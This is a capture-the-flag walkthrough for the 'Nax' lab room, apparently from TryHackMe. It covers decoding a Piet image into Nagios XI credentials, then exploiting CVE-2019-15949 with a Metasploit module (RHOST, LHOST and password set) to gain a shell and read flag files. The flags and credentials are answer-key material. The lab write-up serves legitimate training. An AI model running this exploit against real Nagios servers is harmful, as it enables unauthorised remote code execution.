# Nax

> John Hammond | August 12th, 2020

--------------------

```bash
export IP=10.10.255.52
```

# Task 1 - Flag

1. What hidden file did you find?

Find this with the elements

```

```

2. Who is the creator of this file?

```
Piet Mondrian
```

Use exiftool to get the author

To decode the `piet` image, use `npiet`.

To compile npiet, you need this dependency:

```
sudo apt install -y libgd-dev
```

I had to use a file with this hash:

```
f590248819089bc840b16211c222b83b  test.png
```

This file came on a whim when downloading via curl:

```
curl http://10.10.63.174/PI3T.PNg
```

And I had to use npiet-1.3e, which is old. I found it here:

https://gitlab.mpfservers.de/tobias/ctf/blob/e9d4ea02b1f0c2fe217fd7cb9232d6cb56ce92c9/hackvent2018/day06/npiet-1.3e/npiet.1

```
nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdY
```

3. What is the username you found?

```
nagiosadmin
```

4. What is the password you found?

```
n3p3UQ&9BjLp4$7uhWdY
```

5. What is the CVE number for this vulnerability?

```
CVE-2019-15949
```

6. No answer needed.

7. After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?

```
exploit/linux/http/nagios_xi_authenticated_rce
```

8. Compromise the machine and locate user.txt

```
use exploit/linux/http/nagios_xi_authenticated_rce
set LHOST tun0
set RHOST 10.10.63.174
set PASSWORD n3p3UQ&9BjLp4$7uhWdY
```

```
cat /home/galand/user.txt
```

```
THM{84b17add1d72a9f2e99c33bc568ae0f1}
```

9. Locate root.txt

```
THM{c89b2e39c83067503a6508b21ed6e962}
```